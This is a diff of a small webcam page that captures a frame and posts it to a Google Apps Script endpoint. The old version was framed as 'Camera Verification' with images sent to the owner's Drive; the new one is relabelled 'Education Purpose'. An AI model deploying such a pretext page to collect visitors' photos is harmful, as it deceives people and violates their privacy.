@@ -1,18 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Camera Capture</title>
-  <style>
-    body { text-align: center; font-family: sans-serif; }
-    video, canvas { margin: 10px auto; display: block; }
-    button { padding: 10px 20px; font-size: 16px; }
-  </style>
+  <title>Camera Capture Demo</title>
 </head>
 <body>
-  <h2>Camera Verification</h2>
-  <video id="video" autoplay playsinline width="300"></video><br>
-  <button onclick="capture()">Capture</button>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <h2>Camera Capture (Education Purpose)</h2>
+  <video id="video" width="320" height="240" autoplay></video>
+  <br>
+  <button onclick="capture()">📸 Capture</button>
+  <br><br>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
   <script>
     const video = document.getElementById("video");
@@ -20,22 +17,23 @@
     const ctx = canvas.getContext("2d");
 
     navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => { video.srcObject = stream; })
+      .then(stream => video.srcObject = stream)
       .catch(err => alert("Camera access denied"));
 
     function capture() {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       ctx.drawImage(video, 0, 0);
-
       const imageData = canvas.toDataURL("image/png");
+
       fetch("https://script.google.com/macros/s/AKfycbxw_VoB-oR3zuFRgDkvLf3hHyaQbRRVGqCE7rDDsq5Jo_LJkHUMrLYP6iyDNg3GCeW6/exec", {
         method: "POST",
         body: JSON.stringify({ image: imageData }),
         headers: { "Content-Type": "application/json" }
       })
-      .then(res => alert("Image sent! Check your Google Drive."))
-      .catch(err => alert("Error sending image."));
+      .then(response => response.text())
+      .then(data => alert(data))
+      .catch(error => alert("Error: " + error));
     }
   </script>
 </body>
